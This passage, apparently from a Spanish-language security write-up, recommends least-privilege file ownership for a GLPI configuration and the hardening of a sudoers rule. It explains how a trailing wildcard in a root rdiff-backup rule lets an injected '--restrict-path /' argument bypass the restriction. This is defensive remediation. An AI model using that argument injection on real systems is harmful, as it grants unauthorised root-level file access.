   - **Solución:** Aplicar el principio de menor privilegio asignando propietarios dedicados a cada aplicación (`chown -R www-data:www-data /opt/glpi/config`) y restringiendo los permisos de lectura (`chmod 640`) para que cuentas de otros servicios no puedan acceder a archivos sensibles entre aplicaciones.
- **Endurecimiento de la configuración de `sudoers`:**
   - **Problema:** La regla `(root) NOPASSWD: /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only *` utiliza un comodín (`*`) al final, permitiendo inyectar un segundo parámetro `--restrict-path /` que anula la restricción original.
   - **Solución:** Eliminar el comodín de `/etc/sudoers` y definir el comando con argumentos exactos, o bien encapsular la tarea de respaldo dentro de un script propiedad de `root` (sin permisos de escritura para otros usuarios) que valide las rutas antes de ejecutar `rdiff-backup`.